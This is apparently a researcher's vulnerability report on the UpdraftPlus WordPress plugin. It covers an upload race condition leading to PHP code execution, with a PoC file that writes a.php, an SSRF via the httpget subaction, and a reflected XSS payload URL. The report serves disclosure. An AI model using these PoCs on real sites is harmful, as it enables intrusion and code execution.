# wordpress plugin updraftplus vulnerablity

标签（空格分隔）： 未分类

---

# authenticated  upload file and php code execution #

file `/wp-content/plugins/updraftplus/admin.php` line 1843 function `plupload_action`

via the name parameter to set filename, and move file content into this file.

![image.png-72.3kB][1]

after the 39 lines, this file be delete
![image.png-296.3kB][2]

there are Race condition, when we view this pages before delete after write in. we can make php code execution.


## PoC ##

file content:
```
<?php
$f = fopen('../a.php','wb');
fwrite($f, '<?php phpinfo();?>');
fclose($f);
```

via upload this file, and view this pages before delete, we can write a a.php into `/wp-content/a.php`

![image.png-105.2kB][3]

![image.png-89.2kB][4]

![image.png-172.5kB][5]

# authenticated ssrf #

file `/wp-content/plugins/updraftplus/admin.php` line 1233 function updraft_ajax_handler 

when `subaction='httpget'`the curl parameter follow into function http_get,

![image.png-26.1kB][6]

![image.png-163.4kB][7]

they will use curl to request url, it can be exploited to conduct server-side request forgery (SSRF) attacks.



## PoC ##

login and view website
```
http://127.0.0.1/wordpress4.8/wp-admin/options-general.php?page=updraftplus&tab=expert
```

![image.png-8.9kB][8]

use fetch(curl)

![image.png-20.9kB][9]


## authenticated reflected xss ##

管理员权限
```
http://127.0.0.1/wordpress4.8/wp-admin/admin-ajax.php?action=updraft_ajax&subaction=httpget&nonce=69b5fc40ca&uri=http%3A%2F%2F0%2F<img src=233 onerror=alert(1)>&curl=1
```


  [1]: http://static.zybuluo.com/LoRexxar/ypg8xnr3sond8644y8swl8jc/image.png
  [2]: http://static.zybuluo.com/LoRexxar/68a8puqj0k96ifgmryzi2ogw/image.png
  [3]: http://static.zybuluo.com/LoRexxar/u7y5hg3m1y2nj2c8kxbbhuk6/image.png
  [4]: http://static.zybuluo.com/LoRexxar/8o61e5tla9dglj0m5g2z7349/image.png
  [5]: http://static.zybuluo.com/LoRexxar/r1pfhrohhin6kj295zoqckjh/image.png
  [6]: http://static.zybuluo.com/LoRexxar/nvvhoe3gxmepnug6yf6aaojr/image.png
  [7]: http://static.zybuluo.com/LoRexxar/pksfa3e4gtjg6ztgnuubedkb/image.png
  [8]: http://static.zybuluo.com/LoRexxar/smc72erghubs8a1xvtzo5sjp/image.png
  [9]: http://static.zybuluo.com/LoRexxar/qa12ejx4ad0pf4c245fe3nqg/image.png